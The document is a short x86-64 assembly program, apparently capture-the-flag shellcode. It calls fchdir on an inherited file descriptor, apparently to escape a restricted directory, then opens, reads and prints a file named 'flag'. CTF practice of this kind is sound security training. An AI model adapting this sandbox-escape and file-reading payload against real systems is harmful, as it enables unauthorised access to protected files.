global _start


_start:
    mov rbp, rsp
    sub rsp, 100
    mov r11, 0
loop:
    mov byte[rsp + r11], 0
    inc r11
    cmp r11, 100
    jne loop

    mov rax, 81
    mov rdi, 3
    syscall
    

    mov rax, 2
    lea rdi, [rel filename]
    xor rsi, rsi
    mov rdx, 1
    syscall
    
    mov rdi, rax
    mov rax, 0
    lea rsi, [rsp]
    mov rdx, 100
    syscall

    mov rax, 1
    lea rsi, [rsp]
    mov rdi, 1
    mov rdx, 100
    syscall

    mov rax, 60
    syscall

filename:
    db "flag", 0
